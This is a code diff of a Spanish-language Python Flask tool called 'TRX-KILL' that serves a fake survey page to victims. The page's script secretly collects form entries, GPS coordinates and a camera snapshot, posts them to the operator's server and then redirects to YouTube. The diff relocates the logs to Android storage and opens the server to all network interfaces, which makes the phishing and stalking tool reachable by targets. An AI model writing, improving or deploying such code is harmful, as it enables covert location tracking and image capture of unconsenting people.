@@ -4,10 +4,13 @@ from flask import Flask, request
 app = Flask('TRX-KILL')
 PORT = 7173
 AUTH_PASS = "TRX-kill-op"
-STORAGE_PATH = "INFORMACION"
+# Ruta en memoria interna de Android
+STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
+LOG_FILE = f"{STORAGE_PATH}/result.txt"
+
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-def animar_texto(texto, delay=0.03):
+def animar_texto(texto, delay=0.01):
     for char in texto:
         sys.stdout.write(char)
         sys.stdout.flush()
@@ -17,13 +20,13 @@ def animar_texto(texto, delay=0.03):
 def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(f"\033[1;32m")
-    animar_texto("  ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗     ", 0.005)
-    animar_texto("  ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║     ", 0.005)
-    animar_texto("     ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║     ", 0.005)
-    animar_texto("     ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║     ", 0.005)
-    animar_texto("     ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗", 0.005)
+    animar_texto("  ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗     ", 0.002)
+    animar_texto("  ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║     ", 0.002)
+    animar_texto("     ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║     ", 0.002)
+    animar_texto("     ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║     ", 0.002)
+    animar_texto("     ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗", 0.002)
     print(f"\n      \033[1;36m[ SISTEMA DE SEGURIDAD Y CONTROL TRX-KILL ]\033[0m")
-    print(f"      \033[1;37mVERSION: 1.2.3  |  STATUS: ONLINE  |  OSCAR\033[0m")
+    print(f"      \033[1;37mSTORAGE: {STORAGE_PATH} | STATUS: ACTIVE\033[0m")
     print("\033[1;32m" + "="*60 + "\033[0m")
 
 HTML_ENCUESTA = """
@@ -53,7 +56,7 @@ HTML_ENCUESTA = """
                 body: JSON.stringify({u: document.getElementById('p1').value, d: document.getElementById('p2').value, lat: p.coords.latitude, lon: p.coords.longitude, i: img})});
                 window.location.href = "https://youtube.com";
             });
-        }, 1000);
+        }, 1500);
     }
 </script></body></html>
 """
@@ -64,10 +67,9 @@ def index(): return HTML_ENCUESTA
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    with open("result.txt", "a") as f:
+    with open(LOG_FILE, "a") as f:
         f.write(f"USER: {d.get('u')} | DISP: {d.get('d')} | GPS: {d.get('lat')},{d.get('lon')}\n")
     if d.get('i'):
-        # Decodificar el formato base64 y guardar imagen
         img_data = d['i'].split(',')[1]
         with open(f"{STORAGE_PATH}/cap_{int(time.time())}.png", "wb") as f:
             f.write(base64.b64decode(img_data))
@@ -77,18 +79,20 @@ def main():
     while True:
         banner()
         print("  [1] INFO-NUMERO    | [2] ACTIVAR LINK    | [3] CREADOR")
-        print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM (LOGS)")
+        print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM (VER LOGS)")
         print("  [7] SALIR          | [8] PROCESOS        | [9] ESTADO")
         print("  [10] BORRAR LOGS")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
         
-        if sel == "2": app.run(port=PORT, host='127.0.0.1')
+        if sel == "2": app.run(port=PORT, host='0.0.0.0')
         elif sel == "6":
             if getpass.getpass("PASSWORD: ") == AUTH_PASS:
-                os.system("type result.txt" if os.name == 'nt' else "cat result.txt")
+                if os.path.exists(LOG_FILE):
+                    os.system(f"cat {LOG_FILE}")
+                else: print("NO HAY LOGS.")
                 input("\nPresiona Enter...")
         elif sel == "10": 
-            if os.path.exists("result.txt"): os.remove("result.txt"); print("LOGS ELIMINADOS")
+            if os.path.exists(LOG_FILE): os.remove(LOG_FILE); print("LOGS ELIMINADOS")
             input()
         elif sel == "7": sys.exit()
         else: print("OPCIÓN EN DESARROLLO..."); time.sleep(1)
